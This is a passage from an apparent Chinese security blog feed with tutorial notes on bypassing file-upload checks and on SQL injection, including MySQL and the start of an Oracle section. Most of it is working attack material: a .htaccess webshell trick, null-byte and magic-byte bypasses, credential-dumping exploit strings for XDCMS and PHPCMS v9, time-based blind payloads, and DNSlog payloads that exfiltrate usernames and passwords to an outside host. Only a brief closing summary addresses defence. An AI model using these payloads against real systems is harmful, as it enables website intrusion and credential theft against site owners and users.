(检测内容是否合法或含有恶意代码)</li></ol><h2 id="客户端检测绕过-javascript-检测"><a href="#客户端检测绕过-javascript-检测" class="headerlink" title="客户端检测绕过(javascript 检测)"></a>客户端检测绕过(javascript 检测)</h2><ul><li>首先判断JS本地验证</li><li>通常可以根据它的验证警告弹框的速度可以判断，如果你电脑运行比较快，那么我们可以用burp抓包，在点击提交的时候burp没有抓到包，就已经弹框那么说明这个就是本地js验证。</li></ul><ul><li>绕过方法：</li></ul><ol><li>使用burp抓包改名</li><li>使用firebug直接删除掉本地验证的js代码</li><li>添加js验证的白名单如将php的格式添加进去</li></ol><h2 id="客户端白名单绕过"><a href="#客户端白名单绕过" class="headerlink" title="客户端白名单绕过"></a>客户端白名单绕过</h2><ul><li>修改允许上传类型</li></ul><h2 id="服务端检测绕过-MIME-类型检测"><a href="#服务端检测绕过-MIME-类型检测" class="headerlink" title="服务端检测绕过(MIME 类型检测)"></a>服务端检测绕过(MIME 类型检测)</h2><ul><li><p>MIME的作用 ： 使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。</p></li><li><p>web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p></li><li><p>Tomcat的安装目录\conf\web.xml 中就定义了大量MIME类型 ，你可也去看一下。</p></li><li><p>MIME的作用 ： 使客户端软件，区分不同种类的数据，例如web浏览器就是通过MIME类型来判断文件是GIF图片，还是可打印的PostScript文件。</p></li><li><p>web服务器使用MIME来说明发送数据的种类， web客户端使用MIME来说明希望接收到的数据种类。</p></li><li><p>Tomcat的安装目录\conf\web.xml 中就定义了大量MIME类型 ，你可也去看一下。</p></li><li><p>绕过方法：</p><blockquote><p>直接使用burp抓包，得到post上传数据后，将 Content-Type: text&#x2F;plain改成 Content-Type: image&#x2F;gif<br>就可以成功绕过。</p></blockquote></li></ul><h2 id="服务端检测绕过-目录路径检测"><a href="#服务端检测绕过-目录路径检测" class="headerlink" title="服务端检测绕过(目录路径检测)"></a>服务端检测绕过(目录路径检测)</h2><ul><li>目录路径检测，一般就检测路径是否合法，但稍微特殊一点的都没有防御。 比如比较新的 fckeditor php &lt;&#x3D; 2.6.4 任意文件上传漏洞</li></ul><p>当 POST 下面的 URL 的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/fckeditor263/filemanager/connectors/php/connector.php?Command=FileUpload&amp;Type=Image&amp;</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CurrentFolder=fuck.php%00.gif  HTTP/1.0</span><br></pre></td></tr></table></figure><p>CurrentFolder 这个变量的值会传到 ServerMapFolder($resourceType, $folderPath, $sCommand) 中的形参 $folder 里，而 $folder 在这个函数中并没做任何检测，就被 CombinePaths()了</p><h2 id="修改文件上传路径"><a href="#修改文件上传路径" class="headerlink" title="修改文件上传路径"></a>修改文件上传路径</h2><ul><li>filepath路径修改绕过<br>可以用来突破自动命名规则</li></ul><p>xxxxx.gif</p><ol><li>改变文件上传后的路径<br>&#x2F;a.asp&#x2F;     需要一定 的创建权限，不一定能成功创建<br>成功创建后为<br>&#x2F;a.asp&#x2F;xxxx.gif</li><li>直接改变文件名称<br>&#x2F;a.asp;.<br>修改后为<br>&#x2F;a.asp;.xxxxx.gif</li></ol><h2 id="服务端检测绕过-文件扩展名检测"><a href="#服务端检测绕过-文件扩展名检测" class="headerlink" title="服务端检测绕过(文件扩展名检测)"></a>服务端检测绕过(文件扩展名检测)</h2><ol><li><p>黑名单检测<br>黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多 一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件例如 fckeditor 2.4.3 或之前版本的黑名单</p></li><li><p>白名单检测<br>白名单相对来说比黑名单安全一些，但也不见得就绝对安全了</p></li></ol><h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><ol><li>文件名大小写绕过<br>用像 AsP，pHp 之类的文件名绕过黑名单检测 </li><li>名单列表绕过<br>用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类 </li><li>特殊文件名绕过<br>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix&#x2F;Linux 系统没有这个特性。</li><li>0x00 截断绕过<br>在扩展名检测这一块目前我只遇到过 asp 的程序有这种漏洞，给个简单的伪代码 name &#x3D; getname(http request) &#x2F;&#x2F;假如这时候获取到的文件名是 test.asp .jpg(asp 后面为 0x00)<br>type &#x3D; gettype(name) &#x2F;&#x2F;而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg<br>if (type &#x3D;&#x3D; jpg)</li><li>.htaccess 文件攻击 配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测</li><li>解析调用&#x2F;漏洞绕过 这类漏洞直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用&#x2F;漏洞<h2 id="绕过白名单"><a href="#绕过白名单" class="headerlink" title="绕过白名单"></a>绕过白名单</h2></li><li>0x00 截断绕过<br>用像 test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑 漏洞进行攻击，目前我只遇到过 asp 的程序有这种漏洞</li><li>解析调用&#x2F;漏洞绕过 这类漏洞直接配合上传一个代码注入过的白名单文件即可，再利用解析调用&#x2F;漏洞</li></ol><ul><li>.htaccess 文件攻击<br>通过一个.htaccess 文件调用 php 的解析器去解析一个文件名中只要包含”haha”这个字符串的 任意文件，所以无论文件名是什么样子，只要包含”haha”这个字符串，都可以被以 php 的方 式来解析，是不是相当邪恶，一个自定义的.htaccess 文件就可以以各种各样的方式去绕过很 多上传验证机制<br>建一个.htaccess 文件，里面的内容如下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;haha&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>同目录有个我们上传一个只有文件名并包含字符串”haha”，但是却无任何扩展名的文件 里面的内容是 php 一句话木马<h2 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h2><h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2></li></ul><ul><li>基于上传文件后名称不改变</li><li>利用多线程并发访问触发上传后的文件，让其生成一个webshell<h2 id="服务端检测绕过-文件内容检测"><a href="#服务端检测绕过-文件内容检测" class="headerlink" title="服务端检测绕过(文件内容检测)"></a>服务端检测绕过(文件内容检测)</h2></li><li>如果文件内容检测设置得比较严格，那么上传攻击将变得非常困难 也可以说它是在代码层检测的最后一道关卡 如果它被突破了，就算没有代码层的漏洞 也给后面利用应用层的解析漏洞带来了机会<h2 id="绕过检测文件头"><a href="#绕过检测文件头" class="headerlink" title="绕过检测文件头"></a>绕过检测文件头</h2></li><li>主要是检测文件内容开始处的文件幻数.</li><li>要绕过 jpg 文件幻数检测就要在文件开头写上下图的值<br>Value &#x3D; FF D8 FF E0 00 10 4A 46 49 46</li><li>要绕过 gif 文件幻数检测就要在文件开头写上下图的值<br>Value &#x3D; 47 49 46 38 39 61</li><li>要绕过 png 文件幻数检测就要在文件开头写上下面的值<br>Value &#x3D; 89 50 4E 47</li><li>然后在文件幻数后面加上自己的一句话木马代码就行了<h2 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h2>这个是最变态的检测了，一般是调用 API 或函数去进行文件加载测试 常见的是图像渲染测试，再变态点的甚至是进行二次渲染(后面会提到) 对渲染&#x2F;加载测试的攻击方式是代码注入绕过 对二次渲染的攻击方式是攻击文件加载器自身</li></ul><p>先说下对渲染&#x2F;加载测试攻击 - 代码注入绕过 可以用图像处理软件对一张图片进行代码注入 用 winhex 看数据可以分析出这类工具的原理是<br>在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区 对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的</p><h2 id="绕过二次渲染"><a href="#绕过二次渲染" class="headerlink" title="绕过二次渲染"></a>绕过二次渲染</h2><p>攻击函数本身<br>通过上传不完整的图片让其渲染函数暴露，然后攻击之。<br>第二种方法<br>对文件加载器进行溢出攻击。</p><h1 id="表单提交按钮"><a href="#表单提交按钮" class="headerlink" title="表单提交按钮"></a>表单提交按钮</h1><p>写入表单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot; name=&quot;bb&quot;&gt;</span><br></pre></td></tr></table></figure><p>上传a.asa</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>在经过分析上传漏洞之后，上传漏洞最终的形成原因主要有以下两点：</p><ul><li>目录过滤不严，攻击者可能建立畸形目录：</li><li>文件未重命名，攻击者可能利用Wb容器解析漏洞。<br>如果把握好这两点，上传漏洞的风险就大大减少了。</li><li>接收文件及其文件临时路径。</li><li>获取扩展名与白名单做对比，如果没有命令，程序退出。</li><li>对文件进行重命名。<br>以上步骤在代码阶段基本可以解决上传漏洞，但不能说完全防御，因为没有绝对的安全。<br>比如Web容器使用为Apache，并且不识别RAR格式，攻击者就可以上传“正常文件”，配合Apache解析漏洞入侵。所以，不仅在程序编写方面要注意，在服务器配置、Wb容器配置也要注意，安全是个整体。<br>上传漏洞是完全可以避免的，你需要做的仅仅是对路径进行验证、对文件进行随机重命名。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入- 其他注入漏洞</title>
      <link href="/archives/59c38e3c.html"/>
      <url>/archives/59c38e3c.html</url>
      
        <content type="html"><![CDATA[<h1 id="各种提交方式注入的挖掘"><a href="#各种提交方式注入的挖掘" class="headerlink" title="各种提交方式注入的挖掘"></a>各种提交方式注入的挖掘</h1><h2 id="常见的提交方式"><a href="#常见的提交方式" class="headerlink" title="常见的提交方式"></a>常见的提交方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">POST</span><br><span class="line">COOKIE</span><br><span class="line">HEAD</span><br><span class="line">PUT</span><br><span class="line">OPTION</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="get注入"><a href="#get注入" class="headerlink" title="get注入"></a>get注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">get注入比较常见</span><br><span class="line">例如：</span><br><span class="line">www.xxxx.com/new.asp?id=11&amp;ssid=123&amp;bid=55</span><br><span class="line">And 1=1</span><br><span class="line">And 1=2</span><br><span class="line">/ -0</span><br><span class="line">‘    %bf’</span><br><span class="line">“</span><br></pre></td></tr></table></figure><h2 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h2><p>post提交方式主要适用于表单的提交<br>可能存在漏洞的位置：<br>搜索框、登录、留言、注册<br>挖掘的时候注入魔术引号</p><p>例如：<br><a href="http://www.cracerxxx.com/admin.php">www.cracerxxx.com/admin.php</a><br>测试站点：<br><a href="http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName=">http://testasp.vulnweb.com/login.asp?tfUPass=&amp;tfUName=</a></p><p>测试工具<br>pangolin  sqlmap<br>Xdcms +burp注入</p><h2 id="XDCMS全版本存在sql注入漏洞"><a href="#XDCMS全版本存在sql注入漏洞" class="headerlink" title="XDCMS全版本存在sql注入漏洞"></a>XDCMS全版本存在sql注入漏洞</h2><ul><li>需要使用代理抓包改包工具进行完成。</li><li>sql exp<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%60%3D%28select%20group_concat%28username%2C0x3a%2Cpassword%29%20from%20c_admin%20where%20id%3D1%29%23</span><br></pre></td></tr></table></figure></li></ul><h2 id="COOKIE注入"><a href="#COOKIE注入" class="headerlink" title="COOKIE注入"></a>COOKIE注入</h2><ul><li><p>cookie提交用于账号密码的cookie缓存</p></li><li><p>还可以通过cookie注入来突破简单的防注入系统</p></li><li><p>清空地址栏，输入：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30and 1=2&quot;))，然后去掉？id=1556输入http://soft.XXXXX.edu.cn/list.asp，返回正常</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie=”id=”+escape(“1556 and 1=2 select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,,27,28,29,30 from admin”))</span><br></pre></td></tr></table></figure></li></ul><h2 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h2><ul><li><p>常见的http请求中存在注入的参数<br>User-agent<br>Referer<br>X-Forwarded-For<br>Client-ip   </p></li><li><p>发现方法：<br>               burp抓包添加污染参数</p></li><li><p>火狐插件：<br>                modify headers<br>                tamper data </p><h3 id="HTTP头注入-1"><a href="#HTTP头注入-1" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /uploads/comment.php?act=send HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: PHPSESSID=caiu1hm6vu2mp9b5m019ku9107</span><br><span class="line">client-ip:1&#x27;</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line"></span><br><span class="line">mood=6&amp;comment=test&amp;id=1&amp;type=1&amp;submit=%CC%E1%BD%BB%C6%C0%C2%DB</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exp构造分析"><a href="#exp构造分析" class="headerlink" title="exp构造分析"></a>exp构造分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#x27;&#x27;, &#x27;1&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;6&#x27;, &#x27;test&#x27;, &#x27;1480988752&#x27;, &#x27;111&#x27;&#x27;, &#x27;1&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;,&#x27;xxx&#x27;),(&#x27;&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,(select concat(admin_name,0x3a,pwd) from blue_admin limit 0,1),&#x27;1645457407&#x27;,&#x27;sss&#x27;,&#x27;1&#x27;)#</span><br></pre></td></tr></table></figure><h1 id="伪静态注入的挖掘"><a href="#伪静态注入的挖掘" class="headerlink" title="伪静态注入的挖掘"></a>伪静态注入的挖掘</h1></li><li><p>“伪静态”顾名思义就是一种表面上看似是静态网页（以.html、.htm等结尾），不存在任何的数据交互，却其实是动态网页，存在数据交互的网站，具有这种特性的网页成为“伪静态网页”。我们看到的伪静态网页其实是经过处理的，将动态网页的id等参数通过URL重写来隐藏，让查看者以为是静态网页。</p></li><li><p>如果看到一个以.html或者.htm结尾的网页，此时可以通过在地址输入框中输入：javascript:alert(document.lastModified)，来得到网页最后的修改时间，如果得到的时间和现在时间一致，此页面就是伪静态，反之是真静态；因为动态页面的最后修改时间总是当前时间，而静态页面的最后修改时间则是它生成的时间。时间一致，说明该网站是伪静态。</p></li><li><p>试出页面是：.php、.aps还是.aspx，找出id和值，判断注入点，再利用sqlmap工具进行辅助注入。</p><h1 id="延迟注入漏洞"><a href="#延迟注入漏洞" class="headerlink" title="延迟注入漏洞"></a>延迟注入漏洞</h1></li><li><p>延时注入是通过页面返回的时间来判断的</p></li><li><p>不同的mysql数据库版本，延迟注入语句也不同</p></li><li><p>mysql &gt;&#x3D;5.0  的可以使用sleep()进行查询</p></li><li><p>mysql&lt;5.0  的可以使用benchmark()进行查询</p></li><li><p>benchmark用法<br>benchmark(n,sql语句)  n为查询次数<br>通过查询次数增多 时间变得缓慢来判断是否存在延迟</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(1000,select * from admin) ;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sleep()延迟注入用法</span><br><span class="line">sleep 可以强制产生一个固定的延迟。</span><br><span class="line">sleep()延迟注入核心原理</span><br><span class="line">and if(true,sleep(5),0); ==IF(1=1, true, false);</span><br><span class="line">id=1 and sleep(5)  判断下是否存在延迟注入</span><br><span class="line">and if(substring(user(),1,4)=&#x27;root&#x27;,sleep(5),1) 判断当前用户</span><br><span class="line">and if(MID(version(),1,1) LIKE 5, sleep(5), 1)  判断数据库版本信息是否为5</span><br><span class="line">可以去猜解他的数据库名称</span><br><span class="line">and if(ascii(substring(database(),1,4))&gt;100,sleep(5),1)</span><br><span class="line">and If(ascii(substr(database(),1,1))&lt;115,sleep(10),1)--+</span><br><span class="line">and If(length((version()))=6,sleep(10),1)--+</span><br><span class="line">sqlmap --time-sec=2  延迟注入 </span><br></pre></td></tr></table></figure></li></ul><h1 id="dnslog-注入"><a href="#dnslog-注入" class="headerlink" title="dnslog 注入"></a>dnslog 注入</h1><ul><li>dnslog 平台会记录域名dns查询记录，通过我们把查询的结果和dns子域名拼接，发送给dnslog平台查询，就会记录我们的语句查询结果，从而快速提升延迟注入速度。</li><li>条件：<br>root权限（要借助load_file()函数）</li></ul><h1 id="dns-注入列表名"><a href="#dns-注入列表名" class="headerlink" title="dns 注入列表名"></a>dns 注入列表名</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and if((select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;jian&#x27; limit 0,1),&#x27;.tunxf1.dnslog.cn\\abc&#x27;))),1,1)--+#查表名</span><br><span class="line">and if((select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;xycms&#x27; limit 0,1),&#x27;.7dluss.dnslog.cn\\abc&#x27;))),1,1)--+</span><br><span class="line">and if((select load_file(concat(&#x27;\\\\&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;xycms&#x27; limit 1,1),&#x27;.7dluss.dnslog.cn\\abc&#x27;))),1,1)--+</span><br></pre></td></tr></table></figure><h2 id="dns注入列列名"><a href="#dns注入列列名" class="headerlink" title="dns注入列列名"></a>dns注入列列名</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">列列名</span><br><span class="line">and if((select load_file(concat(&#x27;\\\\&#x27;,(select column_name from information_schema.columns where table_name=&#x27;user&#x27; limit 0,1),&#x27;.7dluss.dnslog.cn\\abc&#x27;))),1,1)--+</span><br><span class="line">and if((select load_file(concat(&#x27;\\\\&#x27;,(select column_name from information_schema.columns where table_name=&#x27;user&#x27; and TABLE_SCHEMA=&#x27;dbname&#x27; limit 0,1),&#x27;.7dluss.dnslog.cn\\abc&#x27;))),1,1)--+</span><br><span class="line"></span><br><span class="line">第二个列名</span><br><span class="line">and if((select load_file(concat(&#x27;\\\\&#x27;,(select column_name from information_schema.columns where table_name=&#x27;user&#x27; limit 1,1),&#x27;.7dluss.dnslog.cn\\abc&#x27;))),1,1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="dns注入列数据"><a href="#dns注入列数据" class="headerlink" title="dns注入列数据"></a>dns注入列数据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">列数据</span><br><span class="line">and if((select load_file(concat(&#x27;\\\\&#x27;,(select username from user limit 0,1),&#x27;.7dluss.dnslog.cn\\abc&#x27;))),1,1)--+</span><br><span class="line"></span><br><span class="line">and if((select load_file(concat(&#x27;\\\\&#x27;,(select password from user limit 0,1),&#x27;.7dluss.dnslog.cn\\abc&#x27;))),1,1)--+</span><br></pre></td></tr></table></figure><h1 id="BASE64编码注入漏洞"><a href="#BASE64编码注入漏洞" class="headerlink" title="BASE64编码注入漏洞"></a>BASE64编码注入漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">解码</span><br><span class="line">构造语句</span><br><span class="line">编码</span><br><span class="line">$id=base64_decode($id);</span><br></pre></td></tr></table></figure><h1 id="二阶注入漏洞"><a href="#二阶注入漏洞" class="headerlink" title="二阶注入漏洞"></a>二阶注入漏洞</h1><p>SQL注入一般可分为两种，一阶注入（普通的SQL注入）和二阶SQL注入。一阶SQL注入发生在一个HTTP请求和响应中，系统对攻击输入立即反应执行。</p><ul><li>一阶注入的攻击过程归纳如下：<ol><li>攻击者在HTTP请求中提交恶意sql语句。</li><li>应用处理恶意输入，使用恶意输入动态构建SQL语句。</li><li>如果攻击实现，在响应中向攻击者返回结构。</li></ol></li><li>二阶注入，作为sql注入的一种，他不同于普通的SQL注入，恶意代码被注入到web应用中不立即执行，而是存储到后端数据库，在处理另一次不同请求时，应用检索到数据库中的恶意输入并利用它动态构建SQL语句，实现了攻击。</li><li>二阶SQL注入的攻击过程归纳如下：<ol><li>攻击者在一个HTTP请求中提交恶意输入</li><li>用于将恶意输入保存在数据库中。</li><li>攻击者提交第二个HTTP请求。</li><li>为处理第二个HTTP请求，应用检索存储在后端数据库中的恶意输入，动态构建SQL语句。</li><li>如果攻击实现，在第二个请求的响应中向攻击者返回结果。</li></ol></li><li>一般攻击利用是两种方式：<ol><li>攻击存储</li><li>注入攻击</li></ol></li></ul><h1 id="PHPV9-authkey-注入漏洞"><a href="#PHPV9-authkey-注入漏洞" class="headerlink" title="PHPV9 authkey 注入漏洞"></a>PHPV9 authkey 注入漏洞</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用exp爆出authkey</span><br><span class="line">phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=getapplist&amp;auth_data=v=1&amp;appid=1&amp;data=662dCAZSAwgFUlUJBAxbVQJXVghTWVQHVFMEV1MRX11cBFMKBFMGHkUROlhBTVFuW1FJBAUVBwIXRlgeERUHQVlIUVJAA0lRXABSQEwNXAhZVl5V</span><br><span class="line">然后本地构造注入页面进行注入</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="XML-注入漏洞"><a href="#XML-注入漏洞" class="headerlink" title="XML 注入漏洞"></a>XML 注入漏洞</h1><p><code>.xml</code>可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。<br>在电子计算机中，标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种的信息比如文章等。它可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 它非常适合万维网传输，提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据。是Internet环境中跨平台的、依赖于内容的技术，也是当今处理分布式结构信息的有效工具。早在1998年，W3C就发布了XML1.0规范，使用它来简化Internet的文档信息传输。</p><ul><li><p>漏洞形成原因：</p><ol><li>代码过滤不严</li><li>用户可以控制<h1 id="APP-注入漏洞挖掘"><a href="#APP-注入漏洞挖掘" class="headerlink" title="APP 注入漏洞挖掘"></a>APP 注入漏洞挖掘</h1></li></ol></li><li><p>利用抓包工具获取app发送到服务器的链接</p><ol><li>burp fiddler即可</li><li>得到链接进行测试</li></ol></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入- Oracle&amp;Postgresql注入漏洞</title>
      <link href="/archives/52c2c83e.html"/>
      <url>/archives/52c2c83e.html</url>
      
        <content type="html"><![CDATA[<h1 id="oracle数据库介绍"><a href="#oracle数据库介绍" class="headerlink" title="oracle数据库介绍"></a>oracle数据库介绍</h1><p>Oracle数据库系统是美国ORACLE公司（甲骨文）提供的以分布式数据库为核心的一组软件产品。是目前世界上使用最为广泛的数据库管理系统。基于“客户端&#x2F;服务器”模式结构，客户端应用程序与用户交互，接收用户信息，并向服务器发送请求，服务器系统负责管理数据信息和各种操作数据的活动。<br>特点</p><ol><li>支持多用户、大事务量的处理</li><li>数据安全性和完整性的有效控制</li><li>支持分布式数据处理</li><li>移植性强</li></ol><h2 id="Oracle-手工注入"><a href="#Oracle-手工注入" class="headerlink" title="Oracle 手工注入"></a>Oracle 手工注入</h2><h3 id="判断数据库"><a href="#判断数据库" class="headerlink" title="判断数据库"></a>判断数据库</h3><ul><li><p>判断注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br></pre></td></tr></table></figure></li><li><p>判断oracle数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and exists(select * from dual) </span><br><span class="line">and exists(select * from user_tables)</span><br></pre></td></tr></table></figure><h3 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 11   返回正常</span><br><span class="line">order by 12    返回错误</span><br></pre></td></tr></table></figure><h3 id="获取数据类型不匹配的列"><a href="#获取数据类型不匹配的列" class="headerlink" title="获取数据类型不匹配的列"></a>获取数据类型不匹配的列</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100 union select null,null,null,null,null,null,null,null,null,null,null from dual</span><br></pre></td></tr></table></figure><h3 id="获取数据类型不匹配的列-1"><a href="#获取数据类型不匹配的列-1" class="headerlink" title="获取数据类型不匹配的列"></a>获取数据类型不匹配的列</h3></li><li><p>在每列上逐个用数字代替 如果返回正常说明该列为数字类型，反之则为非数字类型。</p></li><li><p>也可以逐个用引号引起来如：’null’,null…from dual, 返回正常说明该列为字符类型，反之为非数字类型</p></li></ul><h3 id="获取基本信息"><a href="#获取基本信息" class="headerlink" title="获取基本信息"></a>获取基本信息</h3><p>获取数据库版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select banner from sys.v_$version where rownum=1)</span><br></pre></td></tr></table></figure><p>获取操作系统版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( select member from v$logfile where rownum=1)</span><br></pre></td></tr></table></figure><p>获取连接数据库的当前用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( select SYS_CONTEXT (&#x27;USERENV&#x27;,&#x27;CURRENT_USER&#x27;)from dual)</span><br></pre></td></tr></table></figure><p>获取数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select owner from all_tables where rownum=1)</span><br></pre></td></tr></table></figure><h3 id="获取数据库版本"><a href="#获取数据库版本" class="headerlink" 